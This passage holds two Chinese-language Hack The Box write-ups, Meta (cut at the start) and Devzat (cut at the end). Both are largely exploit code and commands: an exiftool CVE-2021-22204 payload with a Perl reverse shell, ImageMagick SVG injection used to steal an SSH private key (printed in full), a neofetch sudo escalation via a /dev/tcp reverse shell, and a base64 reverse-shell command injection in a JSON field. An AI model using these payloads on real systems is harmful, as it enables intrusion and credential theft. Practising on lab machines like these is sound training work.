Words: 16, Lines: 10] :: Progress: [4989/4989] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:32] :: Errors: 0 :: 有一个dev01，加入到hosts echo 10.10.11.140 dev01.artcorp.htb &gt;&gt; /etc/hosts Uploads看不太懂有什么用，先点点看看吧 这边是一个上传点，上传一个shell试试 提示只能上传jpg和png格式的文件，那就随便拿张图试试吧 这里列出了图片的属性信息，我猜测应该是图片隐写或者exiftool的cve漏洞之类的 本地使用exiftool进行确认一下 可以对上，是exiftool无疑了，去搜索一下exiftool的漏洞 漏洞利用 发现一个可用的漏洞 https://github.com/convisolabs/CVE-2021-22204-exiftool 下载下来后将IP和端口修改为自己的 #!/bin/env python3 import base64 import subprocess ip = &#39;10.10.14.16&#39; port = &#39;4444&#39; payload = b&quot;(metadata \\&quot;\\c${use MIME::Base64;eval(decode_base64(&#39;&quot; payload = payload + base64.b64encode( f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in({port},inet_aton(&#39;{ip}&#39;)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};&quot;.encode() ) payload = payload + b&quot;&#39;))};\\&quot;)&quot; payload_file = open(&#39;payload&#39;, &#39;w&#39;) payload_file.write(payload.decode(&#39;utf-8&#39;)) payload_file.close() subprocess.run([&#39;bzz&#39;, &#39;payload&#39;, &#39;payload.bzz&#39;]) subprocess.run([&#39;djvumake&#39;, &#39;exploit.djvu&#39;, &quot;INFO=1,1&quot;, &#39;BGjp=/dev/null&#39;, &#39;ANTz=payload.bzz&#39;]) subprocess.run([&#39;exiftool&#39;, &#39;-config&#39;, &#39;configfile&#39;, &#39;-HasselbladExif&lt;=exploit.djvu&#39;, &#39;image.jpg&#39;]) 然后执行 ┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool] └─# python3 exploit.py 1 image files updated ┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool] └─# ls configfile exploit.djvu exploit.py image.jpg image.jpg_original lab payload payload.bzz README.md 生成出来的image.jpg就是我们的shell了，拿去上传到web里 然后本地运行一个nc监听端口 nc -nvlp 4444 选择后执行即可 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39314 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; bash-5.0$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功拿到一个shell Ctrl+Z返回 stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 权限提升User在&#x2F;home&#x2F;thomas中看到有.ssh文件夹 进入.ssh文件夹拿key，但是发现没权限 bash-5.0$ find /usr/ -type f -newermt &#39;2022-01-01&#39; -ls 152500 4 -rwxr-xr-x 1 root root 126 Jan 3 10:13 /usr/local/bin/convert_images.sh 查找一下从2022-01-01开始创建的新文件，找到了一个sh脚本 或是运行pspy64也可以发现这个脚本 我们查看一下 #!/bin/bash cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null pkill mogrify 这里mogrify只是一个简单的脚本，使用ImageMgick的mogrify将发现的文件转换为png bash-5.0$ /usr/local/bin/mogrify -version Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org Copyright: © 1999-2020 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html 有一个相关漏洞 生成一个poc.svg &lt;image authenticate=&#39;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#39;&gt; &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt; &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt; &lt;resize geometry=&quot;400x400&quot; /&gt; &lt;write filename=&quot;test.png&quot; /&gt; &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt; &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt; &lt;/svg&gt; &lt;/image&gt; 测试一下是否可以以thomas的身份执行命令 cp poc.svg /var/www/dev01.artcorp.htb/convert_images/ bash-5.0$ ls -la total 12 drwxrwxrwt 2 root root 100 Feb 21 23:53 . drwxr-xr-x 16 root root 3080 Feb 21 10:51 .. -rw-r--r-- 1 thomas thomas 54 Feb 21 23:53 0wned -rw-r--r-- 1 www-data www-data 406 Feb 21 23:52 poc.svg bash-5.0$ cat 0wned uid=1000(thomas) gid=1000(thomas) groups=1000(thomas) 确认可以以thomas的身份执行命令，咱们修改一下poc的第一句，用thomas的权限把ssh的key给拿出来 &lt;image authenticate=&#39;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#39;&gt; 然后再执行一次 bash-5.0$ ls -la total 16 drwxrwxrwt 2 root root 120 Feb 21 23:58 . drwxr-xr-x 16 root root 3080 Feb 21 10:51 .. -rw-r--r-- 1 thomas thomas 54 Feb 21 23:53 0wned -rw-r--r-- 1 thomas thomas 2590 Feb 21 23:58 id_rsa -rw-r--r-- 1 www-data www-data 422 Feb 21 23:56 poc.svg 已经储存过来了，查看一下 -----BEGIN OPENSSH PRIVATE KEY----- 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 bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY----- 成功拿到thomas的key，现在保存到本地id_rsa后给他600的权限 chmod 600 id_rsa 然后使用ssh进行连接 ┌──(root💀kali)-[~/Desktop] └─# ssh thomas@artcorp.htb -i id_rsa Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Feb 21 15:30:44 2022 from 10.10.14.147 -bash-5.0$ whoami&amp;&amp;id thomas uid=1000(thomas) gid=1000(thomas) groups=1000(thomas) -bash-5.0$ ls user.txt -bash-5.0$ cat user.txt 9e36bb6959f1ba118cfe71b928ac66b6 成功拿到user权限的flag文件 Root-bash-5.0$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\&quot;\\&quot; sudo -l看到有一个可以root权限执行的neofetch https://gtfobins.github.io/gtfobins/neofetch/ 这里找到一个提权相关的 但是有一点不一样，这里的权限只能使用指定参数 但是会保留XDG_CONFIG_HOME的环境变量 然后当前用户的neofetch配置文件可控 现在按照这个思路来操作吧 -bash-5.0$ cd ~/.config/neofetch/ -bash-5.0$ ls -la total 24 drwxr-xr-x 2 thomas thomas 4096 Feb 21 13:32 . drwxr-xr-x 3 thomas thomas 4096 Aug 30 13:01 .. -rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf 在config.conf的第一行添加一个反向shell /bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1&quot; 将thomas.config导出到基本配置环境路径 export XDG_CONFIG_HOME=&quot;$HOME/.config&quot; 在本地启用nc监听一个端口 nc -nvlp 4444 以root权限执行neofetch文件 sudo -u root /usr/bin/neofetch \\&quot;\\&quot; ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39366 root@meta:/home/thomas/.config/neofetch# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功获得root权限 root@meta:/home/thomas/.config/neofetch# cd /root cd /root root@meta:~# ls ls conf root.txt cat root.txt f3f5e2ad459dbd8842f813bec23889f0 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Devzat - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Devzat","date":"2022-02-20T11:38:36.000Z","updated":"2023-06-13T03:42:57.000Z","comments":true,"path":"2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/","link":"","permalink":"http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/","excerpt":"","text":"Hackthebox - Devzat靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行信息搜集 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:18 EST Nmap scan report for devzat.htb (10.10.11.118) Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: devzat - where the devs at 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.91%I=7%D=2/19%Time=6210A7FD%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=6210A83 OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 241.16 ms 10.10.14.1 2 241.26 ms devzat.htb (10.10.11.118) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.93 seconds Http这里有一个http服务在80端口，直接访问ip会被跳转到devzat.htb页面，咱们添加到hosts再继续访问 echo 10.10.11.118 devzat.htb &gt;&gt; /etc/hosts 这个功能页面有点不明所以，往下看看 这里提示了一条命令，ssh服务疑似在8000端口 搜索相关资料，找到了相关工具 https://github.com/quackduck/devzat 去测试一下试试 ┌──(root💀kali)-[~/Desktop] └─# ssh -l test devzat.htb -p 8000 8 minutes earlier devbot: test has joined the chat test: test test: test test: test test: test devbot: test has left the chat devbot: test has joined the chat 1 minute earlier devbot: test has left the chat devbot: test stayed on for 6 minutes devbot: test has joined the chat devbot: test has left the chat devbot: lucifiel has joined the chat devbot: lucifiel has left the chat devbot: test has joined the chat Less than a minute earlier devbot: test has left the chat devbot: test stayed on for 1 minute Welcome to the chat. There are no more users devbot: test has joined the chat test: /help [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat [SYSTEM] Because there&#39;s SSH apps on all platforms, even on mobile, you can join from anywhere. [SYSTEM] [SYSTEM] Interesting features: [SYSTEM] • Many, many commands. Run /commands. [SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room. [SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines. [SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example. [SYSTEM] • Direct messages! Send a quick DM using =user &lt;msg&gt; or stay in DMs by running /room @user. [SYSTEM] • Timezone support, use /tz Continent/City to set your timezone. [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang &lt;word&gt; to start new games. [SYSTEM] • Emoji replacements! (like on Slack and Discord) [SYSTEM] [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. [SYSTEM] [SYSTEM] Made by Ishan Goel with feature ideas from friends. [SYSTEM] Thanks to Caleb Denio for lending his server! [SYSTEM] [SYSTEM] For a list of commands run [SYSTEM] ┃ /commands test: /commands [SYSTEM] Commands [SYSTEM] clear - Clears your terminal [SYSTEM] message - Sends a private message to someone [SYSTEM] users - Gets a list of the active users [SYSTEM] all - Gets a list of all users who has ever connected [SYSTEM] exit - Kicks you out of the chat incase your client was bugged [SYSTEM] bell - Toggles notifications when you get pinged [SYSTEM] room - Changes which room you are currently in [SYSTEM] id - Gets the hashed IP of the user [SYSTEM] commands - Get a list of commands [SYSTEM] nick - Change your display name [SYSTEM] color - Change your display name color [SYSTEM] timezone - Change how you view time [SYSTEM] emojis - Get a list of emojis you can use [SYSTEM] help - Get generic info about the server [SYSTEM] tictactoe - Play tictactoe [SYSTEM] hangman - Play hangman [SYSTEM] shrug - Drops a shrug emoji [SYSTEM] ascii-art - Bob ross with text [SYSTEM] example-code - Hello world! test: /users [SYSTEM] [test] 没有发现可利用的点 Fuzz去fuzz一下子域名看下 ┌──(root💀kali)-[~/Desktop] └─# ffuf -c -u http://devzat.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devzat.htb&quot; -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://devzat.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.devzat.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ pets [Status: 200, Size: 510, Words: 20, Lines: 21] :: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:33] :: Errors: 0 :: 有一个pets，加入hosts里 echo 10.10.11.118 pets.devzat.htb &gt;&gt; /etc/hosts ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://pets.devzat.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 510 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://pets.devzat.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 510 ________________________________________________ .git [Status: 301, Size: 41, Words: 3, Lines: 3] .git/index [Status: 200, Size: 3884, Words: 51, Lines: 11] .git/config [Status: 200, Size: 92, Words: 9, Lines: 6] .git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2] .git/logs/ [Status: 200, Size: 63, Words: 3, Lines: 5] build [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 40, Words: 3, Lines: 3] server-status [Status: 403, Size: 280, Words: 20, Lines: 10] :: Progress: [4686/4686] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:31] :: Errors: 0 :: 可以看到有一个.git文件，那就是有git备份，下载下来 GitTools https://github.com/LucifielHack/GitTools 使用GitTools给下载下来 ┌──(root💀kali)-[~/Desktop/GitTools] └─# ./Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### 使用gitdumper给dump下来 ┌──(root💀kali)-[~/Desktop/GitTools] └─# ./Extractor/extractor.sh pets ~/Desktop/pets/ ########### # Extractor is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### 然后使用exractor给解压出来 ┌──(root💀kali)-[~/Desktop/pets] └─# ls -la 总用量 20 drwxr-xr-x 5 root root 4096 2月 19 03:50 . drwxr-xr-x 6 root root 4096 2月 19 03:50 .. drwxr-xr-x 4 root root 4096 2月 19 03:50 0-464614f32483e1fde60ee53f5d3b4d468d80ff62 drwxr-xr-x 4 root root 4096 2月 19 03:50 1-ef07a04ebb2fc92cf74a39e0e4b843630666a705 drwxr-xr-x 4 root root 4096 2月 19 03:50 2-8274d7a547c0c3854c074579dfc359664082a8f6 下载可以去本地查看了 代码审计package main import ( &quot;embed&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;io/fs&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; &quot;os/exec&quot; &quot;time&quot; ) //go:embed static/public var web embed.FS //go:embed static/public/index.html var index []byte type Pet struct { Name string `json:&quot;name&quot;` Species string `json:&quot;species&quot;` Characteristics string `json:&quot;characteristics&quot;` } var ( Pets []Pet = []Pet{ {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)}, {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)}, {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)}, {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)}, } ) func loadCharacter(species string) string { cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species) stdoutStderr, err := cmd.CombinedOutput() if err != nil { return err.Error() } return string(stdoutStderr) } func getPets(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(Pets) } func addPet(w http.ResponseWriter, r *http.Request) { reqBody, _ := ioutil.ReadAll(r.Body) var addPet Pet err := json.Unmarshal(reqBody, &amp;addPet) if err != nil { e := fmt.Sprintf(&quot;There has been an error: %+v&quot;, err) http.Error(w, e, http.StatusBadRequest) return } addPet.Characteristics = loadCharacter(addPet.Species) Pets = append(Pets, addPet) w.WriteHeader(http.StatusOK) fmt.Fprint(w, &quot;Pet was added successfully&quot;) } func handleRequest() { build, err := fs.Sub(web, &quot;static/public/build&quot;) if err != nil { panic(err) } css, err := fs.Sub(web, &quot;static/public/css&quot;) if err != nil { panic(err) } webfonts, err := fs.Sub(web, &quot;static/public/webfonts&quot;) if err != nil { panic(err) } spaHandler := http.HandlerFunc(spaHandlerFunc) // Single page application handler http.Handle(&quot;/&quot;, headerMiddleware(spaHandler)) // All static folder handler http.Handle(&quot;/build/&quot;, headerMiddleware(http.StripPrefix(&quot;/build&quot;, http.FileServer(http.FS(build))))) http.Handle(&quot;/css/&quot;, headerMiddleware(http.StripPrefix(&quot;/css&quot;, http.FileServer(http.FS(css))))) http.Handle(&quot;/webfonts/&quot;, headerMiddleware(http.StripPrefix(&quot;/webfonts&quot;, http.FileServer(http.FS(webfonts))))) http.Handle(&quot;/.git/&quot;, headerMiddleware(http.StripPrefix(&quot;/.git&quot;, http.FileServer(http.Dir(&quot;.git&quot;))))) // API routes apiHandler := http.HandlerFunc(petHandler) http.Handle(&quot;/api/pet&quot;, headerMiddleware(apiHandler)) log.Fatal(http.ListenAndServe(&quot;:5000&quot;, nil)) } func spaHandlerFunc(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) w.Write(index) } func petHandler(w http.ResponseWriter, r *http.Request) { // Dispatch by method if r.Method == http.MethodPost { addPet(w, r) } else if r.Method == http.MethodGet { getPets(w, r) } else { http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed) } // TODO: Add Update and Delete } func headerMiddleware(next http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Header().Add(&quot;Server&quot;, &quot;My genious go pet server&quot;) next.ServeHTTP(w, r) }) } func main() { resetTicker := time.NewTicker(5 * time.Second) done := make(chan bool) go func() { for { select { case &lt;-done: return case &lt;-resetTicker.C: // Reset Pets to prestaged ones Pets = []Pet{ {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)}, {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)}, {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)}, {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)}, } } } }() handleRequest() time.Sleep(500 * time.Millisecond) resetTicker.Stop() done &lt;- true } 发现存在一个main.go的文件，咱们看一下 cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species) addPet.Characteristics = loadCharacter(addPet.Species) 看下这两句，很明显的命令注入。 添加宠物功能点的species直接拼接在cmd中，咱们去构造Exploit 漏洞利用Shellecho &quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.47/4444 &lt;&amp;1&#39;&quot; | base64 YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg== {&quot;name&quot;:&quot;lucifiel&quot;,&quot;species&quot;:&quot;cat;echo -n &#39;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==&#39; | base64 -d | bash&quot;} 首先去抓个包 接着替换exp然后使用nc监听一个端口 nc -nvlp 4444 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.11.118] 33274 bash: cannot set terminal process group (889): 